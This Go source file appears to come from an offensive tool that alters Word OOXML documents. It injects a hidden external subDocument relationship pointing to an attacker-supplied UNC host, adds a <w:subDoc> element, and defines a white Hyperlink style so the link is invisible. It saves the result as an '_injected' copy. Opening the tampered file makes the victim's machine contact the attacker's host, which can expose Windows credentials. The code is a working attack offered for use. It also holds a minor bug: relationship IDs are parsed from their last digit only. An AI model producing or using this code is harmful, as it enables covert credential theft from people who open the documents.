package ooxml

import (
	"archive/zip"
	"encoding/xml"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"sort"
	"strconv"
	"strings"
)

// Initializes routine
func Initialize(filePath string) error {
	log.Println("Opening document...")

	// Read zip (ooxml) file
	r, err := zip.OpenReader(filePath)
	if err != nil {
		return err
	}
	defer r.Close()

	// Loop through all the files inside the zip
	for _, f := range r.File {
		rc, err := f.Open()
		if err != nil {
			return err
		}

		// Read all the data inside the file
		zipData, err := io.ReadAll(rc)
		if err != nil {
			return err
		}
		rc.Close()

		// Call editPackage to change the contents of the target file
		if err = editPackage(f, zipData); err != nil {
			return err
		}
	}

	// Call writePackage to save the edited contents to a file
	if err = writePackage(fmt.Sprintf("%s_injected.%s", strings.Split(filePath, ".")[0], strings.Split(filePath, ".")[1])); err != nil {
		return err
	}

	return nil
}

// Edits the contents of a zip file
func editPackage(zipFile *zip.File, zipData []byte) error {
	zipDataStr := string(zipData[:])

	// Only the list of files we need to change
	switch zipFile.Name {
	case CDocumentXMLRels: // Add a new relationship element to the list
		rs := Relationships{}
		if err := xml.Unmarshal(zipData, &rs); err != nil {
			return err
		}

		// The only good reason to parse the XML here is to calculate the amount of rId's there are.
		var idList []int
		for _, rel := range rs.Relationships {
			out, err := strconv.Atoi(rel.Id[len(rel.Id)-1:])
			if err != nil {
				return err
			}

			idList = append(idList, out)
		}
		sort.Ints(idList)
		GlobalVar.TargetId = fmt.Sprintf("rId%d", idList[len(idList)-1]+1)

		log.Printf("Appending new relationship of ID: %s\n", GlobalVar.TargetId)
		rs.Relationships = append(rs.Relationships, Relation{
			Id:         GlobalVar.TargetId,
			Type:       "http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument",
			Target:     fmt.Sprintf("file:///\\\\%s\\doc\\", GlobalVar.Target),
			TargetMode: "External",
		})

		// The only thing that doesn't match the original relationships document are the XML self-closing tags.
		rsParsed, err := marshalWithHeader(rs)
		if err != nil {
			return err
		}

		log.Printf("Applying changes to %s\n", CDocumentXMLRels)
		appendToZip(zipFile.Name, rsParsed)

	case CDocument: // The idea here is find the position of the last </w:p> before <w:sectPr> and append the subdoc element before that

		subdoc := fmt.Sprintf("<w:subDoc r:id=\"%s\"/>", GlobalVar.TargetId)
		idx := strings.LastIndex(zipDataStr, "</w:p>") // For now using </w:p> might work fine. If some people experience errors I'll change to <w:sectPr/>
		if idx == -1 {
			return errors.New("strings.index: failed to find index for </w:p>")
		}
		inserted := zipDataStr[:idx] + subdoc + zipDataStr[idx:]

		log.Printf("Applying changes to %s\n", CDocument)
		appendToZip(zipFile.Name, []byte(inserted))

	case CStyles: // Append a new hyperlink style here
		style := `<w:style w:type="character" w:styleId="Hyperlink"><w:name w:val="Hyperlink"/><w:basedOn w:val="DefaultParagraphFont"/><w:uiPriority w:val="99"/><w:unhideWhenUsed/><w:rsid w:val="00400B73"/><w:rPr><w:color w:val="FFFFFF" w:themeColor="background1"/><w:u w:val="single"/></w:rPr></w:style>`
		idx := strings.LastIndex(zipDataStr, "</w:styles>")
		if idx == -1 {
			return errors.New("strings.index: failed to find index for </w:styles>")
		}
		inserted := zipDataStr[:idx] + style + zipDataStr[idx:]

		log.Printf("Applying changes to %s\n", CStyles)
		appendToZip(zipFile.Name, []byte(inserted))

	default: // Appends all other unchanged files to the zip
		appendToZip(zipFile.Name, zipData)
	}

	return nil
}

// Writes a new zip file with the edited content
func writePackage(filePath string) error {
	log.Printf("Creating new OOXML file at: %s\n", filePath)
	f, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer f.Close()

	w := zip.NewWriter(f)

	for _, file := range ZipArray.Files {
		zf, err := w.Create(file.Name)
		if err != nil {
			return err
		}

		if _, err = zf.Write([]byte(file.Contents)); err != nil {
			return err
		}
	}

	err = w.Close()
	if err != nil {
		return err
	}

	return nil
}

// Appends file and data to a new zip file
func appendToZip(zipName string, zipData []byte) {
	ZipArray.Files = append(ZipArray.Files, ZipFile{
		Name:     zipName,
		Contents: zipData,
	})
}

// Marshals the XML data with the custom XML Prolog
func marshalWithHeader(v interface{}) ([]byte, error) {
	parsed, err := xml.Marshal(v)
	if err != nil {
		return nil, err
	}
	parsed = []byte(Header + string(parsed))

	return parsed, nil
}
